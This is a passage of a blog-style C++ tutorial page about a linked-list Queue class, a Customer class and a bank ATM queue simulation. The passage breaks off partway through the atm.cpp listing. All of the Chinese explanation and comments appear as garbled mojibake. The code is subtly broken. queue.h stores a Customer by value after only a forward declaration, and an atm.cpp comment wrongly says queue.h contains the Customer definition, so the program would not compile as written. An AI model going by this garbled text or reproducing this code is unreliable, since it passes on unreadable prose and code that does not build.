(<code>queue_count</code>)ã€‚</li></ul></li></ol><p>ç”±äºé˜Ÿåˆ—çš„é•¿åº¦å¯èƒ½åœ¨è¿è¡Œæ—¶å˜åŒ–ï¼ˆå®¢æˆ·åŠ å…¥å’Œç¦»å¼€ï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯èƒ½éœ€è¦å¤„ç†æ½œåœ¨çš„å¤§é‡å®¢æˆ·ï¼Œä½¿ç”¨<strong>åŠ¨æ€å†…å­˜åˆ†é…</strong>æ¥å®ç° <code>Queue</code> ç±»æ˜¯åˆé€‚çš„ã€‚æˆ‘ä»¬å°†ä½¿ç”¨**é“¾å¼é˜Ÿåˆ— (Linked Queue)**ï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸€ä¸ª <code>Customer</code> å¯¹è±¡å’Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆã€‚</p><h3 id="12-7-1-é˜Ÿåˆ—ç±»-Queue-Class"><a href="#12-7-1-é˜Ÿåˆ—ç±»-Queue-Class" class="headerlink" title="12.7.1 é˜Ÿåˆ—ç±» (Queue Class)"></a>12.7.1 é˜Ÿåˆ—ç±» (Queue Class)</h3><p><strong>è®¾è®¡è¦ç‚¹:</strong></p><ul><li>  <strong>èŠ‚ç‚¹ç»“æ„ (Node):</strong> åœ¨ <code>Queue</code> ç±»å†…éƒ¨å®šä¹‰ä¸€ä¸ªç§æœ‰çš„ <code>Node</code> ç»“æ„ï¼ˆæˆ–ç±»ï¼‰ï¼ŒåŒ…å«ä¸€ä¸ª <code>Customer</code> å¯¹è±¡ï¼ˆé¡¹ç›®ï¼‰å’Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ª <code>Node</code> çš„æŒ‡é’ˆã€‚</li><li><strong>æ•°æ®æˆå‘˜:</strong><ul><li>  <code>front</code>: æŒ‡å‘é˜Ÿé¦–èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚</li><li>  <code>rear</code>: æŒ‡å‘é˜Ÿå°¾èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚</li><li>  <code>items</code>: å½“å‰é˜Ÿåˆ—ä¸­çš„é¡¹ç›®æ•°ï¼ˆå®¢æˆ·æ•°ï¼‰ã€‚</li><li>  <code>qsize</code>: é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡ï¼ˆæ„é€ æ—¶æŒ‡å®šï¼‰ã€‚</li></ul></li><li><strong>ç‰¹æ®Šæˆå‘˜å‡½æ•° (å¤„ç†åŠ¨æ€å†…å­˜):</strong><ul><li>  <strong>æ„é€ å‡½æ•°:</strong> åˆå§‹åŒ–é˜Ÿåˆ—ä¸ºç©ºï¼Œè®¾ç½®æœ€å¤§å®¹é‡ã€‚</li><li>  <strong>ææ„å‡½æ•°:</strong> é‡Šæ”¾æ‰€æœ‰èŠ‚ç‚¹å ç”¨çš„å†…å­˜ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚</li><li>  <strong>å¤åˆ¶æ„é€ å‡½æ•°:</strong> å®ç°æ·±å¤åˆ¶ï¼Œåˆ›å»ºä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„é˜Ÿåˆ—å‰¯æœ¬ï¼ˆå¦‚æœéœ€è¦å¤åˆ¶é˜Ÿåˆ—ï¼‰ã€‚</li><li>  <strong>èµ‹å€¼è¿ç®—ç¬¦:</strong> å®ç°æ·±å¤åˆ¶èµ‹å€¼ï¼Œå¤„ç†è‡ªæˆ‘èµ‹å€¼å’Œå†…å­˜ç®¡ç†ã€‚</li><li>  <em>(æ³¨æ„ï¼šå¯¹äºè¿™ä¸ªæ¨¡æ‹Ÿï¼Œæˆ‘ä»¬å¯èƒ½ä¸éœ€è¦å¤åˆ¶æˆ–èµ‹å€¼é˜Ÿåˆ—ï¼Œå¯ä»¥è€ƒè™‘ç¦ç”¨å®ƒä»¬æˆ–ä½¿ç”¨é»˜è®¤è¡Œä¸ºï¼Œä½†å®Œæ•´çš„ç±»è®¾è®¡åº”è€ƒè™‘è¿™äº›)</em></li></ul></li><li><strong>å…¬æœ‰æˆå‘˜å‡½æ•° (é˜Ÿåˆ—æ“ä½œ):</strong><ul><li>  <code>bool isempty() const;</code></li><li>  <code>bool isfull() const;</code></li><li>  <code>int queuecount() const;</code></li><li>  <code>bool enqueue(const Customer &amp;item);</code> // æ·»åŠ å®¢æˆ·åˆ°é˜Ÿå°¾</li><li>  <code>bool dequeue(Customer &amp;item);</code>      // ä»é˜Ÿé¦–ç§»é™¤å®¢æˆ·ï¼Œå¹¶é€šè¿‡å¼•ç”¨å‚æ•°è¿”å›</li></ul></li></ul><p><strong>queue.h (Queue ç±»å®šä¹‰)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> QUEUE_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_H_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‰å‘å£°æ˜ Customer ç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸ºäº†ç®€åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ Customer ç±»å‹ï¼Œè€Œä¸æ˜¯æ¨¡æ¿</span></span><br><span class="line"><span class="keyword">typedef</span> Customer Item;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// å†…éƒ¨èŠ‚ç‚¹ç»“æ„</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">        Item item;      <span class="comment">// å­˜å‚¨çš„æ•°æ® (Customer å¯¹è±¡)</span></span><br><span class="line">        Node * next;    <span class="comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Q_SIZE = <span class="number">10</span> &#125;; <span class="comment">// é»˜è®¤é˜Ÿåˆ—å¤§å° (å¯ä»¥ä¿®æ”¹)</span></span><br><span class="line"></span><br><span class="line">    Node * front;       <span class="comment">// æŒ‡å‘é˜Ÿé¦–çš„æŒ‡é’ˆ</span></span><br><span class="line">    Node * rear;        <span class="comment">// æŒ‡å‘é˜Ÿå°¾çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">int</span> items;          <span class="comment">// å½“å‰é˜Ÿåˆ—ä¸­çš„é¡¹ç›®æ•°</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> qsize;    <span class="comment">// é˜Ÿåˆ—æœ€å¤§å®¹é‡ (const æˆå‘˜)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦è®¾ä¸ºç§æœ‰ï¼Œä»¥ç¦æ­¢å¤åˆ¶ (ç®€å•å¤„ç†æ–¹å¼)</span></span><br><span class="line">    <span class="comment">// å¦‚æœéœ€è¦å¤åˆ¶ï¼Œåˆ™éœ€è¦å®ç°æ·±å¤åˆ¶</span></span><br><span class="line">    Queue(<span class="keyword">const</span> Queue &amp; q) : qsize(<span class="number">0</span>) &#123; &#125;</span><br><span class="line">    Queue &amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Queue &amp; q) &#123; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œå¯ä»¥æŒ‡å®šæœ€å¤§å®¹é‡</span></span><br><span class="line">    Queue(<span class="keyword">int</span> qs = Q_SIZE);</span><br><span class="line">    <span class="comment">// ææ„å‡½æ•°</span></span><br><span class="line">    ~Queue();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isempty</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> items == <span class="number">0</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isfull</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> items == qsize; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">queuecount</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> items; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ é¡¹ç›®åˆ°é˜Ÿå°¾</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span></span>;</span><br><span class="line">    <span class="comment">// ä»é˜Ÿé¦–ç§»é™¤é¡¹ç›®</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">dequeue</span><span class="params">(Item &amp;item)</span></span>; <span class="comment">// item ç”¨äºæ¥æ”¶å‡ºé˜Ÿçš„æ•°æ®</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// QUEUE_H_</span></span></span><br></pre></td></tr></table></figure><p><strong>queue.cpp (Queue ç±»å®ç°)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for std::rand() - ä»…ç”¨äº Customer ç¤ºä¾‹ï¼ŒQueue æœ¬èº«ä¸éœ€è¦</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- Customer ç±»å®šä¹‰ (ç®€å•ç‰ˆæœ¬ï¼Œæ”¾åœ¨è¿™é‡Œä»…ä¸ºç¼–è¯‘ Queue) ---</span></span><br><span class="line"><span class="comment">// å®é™…åº”ç”¨ä¸­åº”æ”¾åœ¨å•ç‹¬çš„ customer.h/cpp</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">long</span> arrive;        <span class="comment">// arrival time for customer</span></span><br><span class="line">    <span class="keyword">int</span> processtime;    <span class="comment">// processing time for customer</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Customer() : arrive(<span class="number">0</span>), processtime(<span class="number">0</span>) &#123;&#125; <span class="comment">// default constructor</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">long</span> when)</span> </span>&#123;</span><br><span class="line">        processtime = <span class="built_in">std</span>::rand() % <span class="number">3</span> + <span class="number">1</span>; <span class="comment">// éšæœºå¤„ç†æ—¶é—´ 1-3 åˆ†é’Ÿ</span></span><br><span class="line">        arrive = when;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">when</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> arrive; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ptime</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> processtime; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// --- Customer ç±»å®šä¹‰ç»“æŸ ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Queue æ–¹æ³•å®ç°</span></span><br><span class="line">Queue::Queue(<span class="keyword">int</span> qs) : qsize(qs) &#123; <span class="comment">// åˆå§‹åŒ– const æˆå‘˜ qsize</span></span><br><span class="line">    front = rear = <span class="literal">nullptr</span>; <span class="comment">// åˆå§‹åŒ–ä¸ºç©ºé˜Ÿåˆ—</span></span><br><span class="line">    items = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Queue::~Queue() &#123;</span><br><span class="line">    Node * temp;</span><br><span class="line">    <span class="keyword">while</span> (front != <span class="literal">nullptr</span>) &#123; <span class="comment">// å¾ªç¯ç›´åˆ°é˜Ÿåˆ—ä¸ºç©º</span></span><br><span class="line">        temp = front;          <span class="comment">// ä¿å­˜å½“å‰é˜Ÿé¦–èŠ‚ç‚¹åœ°å€</span></span><br><span class="line">        front = front-&gt;next;   <span class="comment">// ç§»åŠ¨ front æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">        <span class="keyword">delete</span> temp;           <span class="comment">// åˆ é™¤æ—§çš„é˜Ÿé¦–èŠ‚ç‚¹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ é¡¹ç›®åˆ°é˜Ÿå°¾</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Queue::enqueue</span><span class="params">(<span class="keyword">const</span> Item &amp;item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isfull())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// é˜Ÿåˆ—å·²æ»¡ï¼Œæ— æ³•æ·»åŠ </span></span><br><span class="line"></span><br><span class="line">    Node * add = <span class="keyword">new</span> Node; <span class="comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span></span><br><span class="line">    <span class="comment">// å¦‚æœ new å¤±è´¥ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ (è¿™é‡Œç®€åŒ–å¤„ç†ï¼Œæœªæ•è·)</span></span><br><span class="line">    add-&gt;item = item;      <span class="comment">// è®¾ç½®èŠ‚ç‚¹æ•°æ®</span></span><br><span class="line">    add-&gt;next = <span class="literal">nullptr</span>;   <span class="comment">// æ–°èŠ‚ç‚¹æ˜¯é˜Ÿå°¾ï¼Œnext ä¸ºç©º</span></span><br><span class="line">    items++;               <span class="comment">// é¡¹ç›®æ•°å¢åŠ </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (front == <span class="literal">nullptr</span>)  <span class="comment">// å¦‚æœé˜Ÿåˆ—åŸæœ¬ä¸ºç©º</span></span><br><span class="line">        front = add;       <span class="comment">// æ–°èŠ‚ç‚¹åŒæ—¶æ˜¯é˜Ÿé¦–å’Œé˜Ÿå°¾</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        rear-&gt;next = add;  <span class="comment">// å°†åŸé˜Ÿå°¾èŠ‚ç‚¹çš„ next æŒ‡å‘æ–°èŠ‚ç‚¹</span></span><br><span class="line">    rear = add;            <span class="comment">// æ›´æ–° rear æŒ‡å‘æ–°çš„é˜Ÿå°¾èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»é˜Ÿé¦–ç§»é™¤é¡¹ç›®</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Queue::dequeue</span><span class="params">(Item &amp;item)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isempty())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•ç§»é™¤</span></span><br><span class="line"></span><br><span class="line">    item = front-&gt;item;    <span class="comment">// è·å–é˜Ÿé¦–èŠ‚ç‚¹çš„æ•°æ® (é€šè¿‡å¼•ç”¨å‚æ•°è¿”å›)</span></span><br><span class="line">    items--;               <span class="comment">// é¡¹ç›®æ•°å‡å°‘</span></span><br><span class="line">    Node * temp = front;   <span class="comment">// ä¿å­˜é˜Ÿé¦–èŠ‚ç‚¹åœ°å€</span></span><br><span class="line">    front = front-&gt;next;   <span class="comment">// ç§»åŠ¨ front æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">delete</span> temp;           <span class="comment">// åˆ é™¤æ—§çš„é˜Ÿé¦–èŠ‚ç‚¹</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (items == <span class="number">0</span>)        <span class="comment">// å¦‚æœåˆ é™¤åé˜Ÿåˆ—ä¸ºç©º</span></span><br><span class="line">        rear = <span class="literal">nullptr</span>;    <span class="comment">// rear ä¹Ÿè®¾ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-7-2-Customer-ç±»"><a href="#12-7-2-Customer-ç±»" class="headerlink" title="12.7.2 Customer ç±»"></a>12.7.2 Customer ç±»</h3><p>è¿™ä¸ªç±»ç›¸å¯¹ç®€å•ï¼Œåªéœ€è¦å­˜å‚¨å®¢æˆ·çš„åˆ°è¾¾æ—¶é—´å’Œæ‰€éœ€çš„äº¤æ˜“æ—¶é—´ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// customer.h (ç†æƒ³æƒ…å†µä¸‹)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CUSTOMER_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CUSTOMER_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Customer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">long</span> arrive;        <span class="comment">// arrival time for customer</span></span><br><span class="line">    <span class="keyword">int</span> processtime;    <span class="comment">// processing time for customer</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Customer() : arrive(<span class="number">0</span>), processtime(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">long</span> when)</span></span>; <span class="comment">// è®¾ç½®åˆ°è¾¾æ—¶é—´ï¼Œå¹¶éšæœºç”Ÿæˆå¤„ç†æ—¶é—´</span></span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">when</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> arrive; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ptime</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> processtime; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// CUSTOMER_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// customer.cpp (ç†æƒ³æƒ…å†µä¸‹)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;customer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for std::rand()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Customer::set</span><span class="params">(<span class="keyword">long</span> when)</span> </span>&#123;</span><br><span class="line">    processtime = <span class="built_in">std</span>::rand() % <span class="number">3</span> + <span class="number">1</span>; <span class="comment">// å‡è®¾å¤„ç†æ—¶é—´ä¸º 1, 2, æˆ– 3 åˆ†é’Ÿ</span></span><br><span class="line">    arrive = when;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>(åœ¨ä¸Šé¢çš„ <code>queue.cpp</code> ä¸­ï¼Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ç¼–è¯‘ï¼Œå°† <code>Customer</code> çš„ç®€å•å®šä¹‰ç›´æ¥æ”¾åœ¨äº†é‚£é‡Œã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œåº”å°†å…¶åˆ†ä¸º <code>.h</code> å’Œ <code>.cpp</code> æ–‡ä»¶ã€‚)</em></p><h3 id="12-7-3-ATM-æ¨¡æ‹Ÿ-atm-cpp"><a href="#12-7-3-ATM-æ¨¡æ‹Ÿ-atm-cpp" class="headerlink" title="12.7.3 ATM æ¨¡æ‹Ÿ (atm.cpp)"></a>12.7.3 ATM æ¨¡æ‹Ÿ (atm.cpp)</h3><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸»ç¨‹åºæ¥æ‰§è¡Œæ¨¡æ‹Ÿäº†ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt; // for rand() and srand()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;   // for time()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;queue.h&quot;</span> <span class="comment">// åŒ…å« Queue ç±» (å®ƒå†…éƒ¨åŒ…å«äº† Customer çš„ç®€å•å®šä¹‰)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MIN_PER_HR = <span class="number">60</span>; <span class="comment">// æ¯å°æ—¶åˆ†é’Ÿæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šåˆ¤æ–­æ˜¯å¦æœ‰æ–°å®¢æˆ·åˆ°æ¥</span></span><br><span class="line"><span class="comment">// å‚æ•° x: å¹³å‡å¤šå°‘åˆ†é’Ÿæ¥ä¸€ä½å®¢æˆ·</span></span><br><span class="line"><span class="comment">// è¿”å›å€¼: true å¦‚æœè¿™ä¸€åˆ†é’Ÿæœ‰å®¢æˆ·æ¥, false å¦‚æœæ²¡æœ‰</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">newcustomer</span><span class="params">(<span class="keyword">double</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::ios_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®éšæœºæ•°ç§å­</span></span><br><span class="line">    <span class="built_in">std</span>::srand(<span class="built_in">std</span>::time(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Case Study: Bank of Heather Automatic Teller\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter maximum size of queue: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> qs; <span class="comment">// é˜Ÿåˆ—æœ€å¤§é•¿åº¦</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; qs;</span><br><span class="line">    <span class="function">Queue <span class="title">line</span><span class="params">(qs)</span></span>; <span class="comment">// åˆ›å»ºé˜Ÿåˆ—å¯¹è±¡</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the number of simulation hours: &quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> hours; <span class="comment">// æ¨¡æ‹Ÿæ€»å°æ—¶æ•°</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; hours;</span><br><span class="line">    <span class="comment">// æ¨¡æ‹Ÿä»¥åˆ†é’Ÿä¸ºå•ä½è¿›è¡Œ</span></span><br><span class="line">    <span class="keyword">long</span> cyclelimit = MIN_PER_HR * hours; <span class="comment">// æ€»æ¨¡æ‹Ÿåˆ†é’Ÿæ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the average number of customers per hour: &quot;</span>;</span><br><span class="line">    <span class="keyword">double</span> perhour; <span class="comment">// 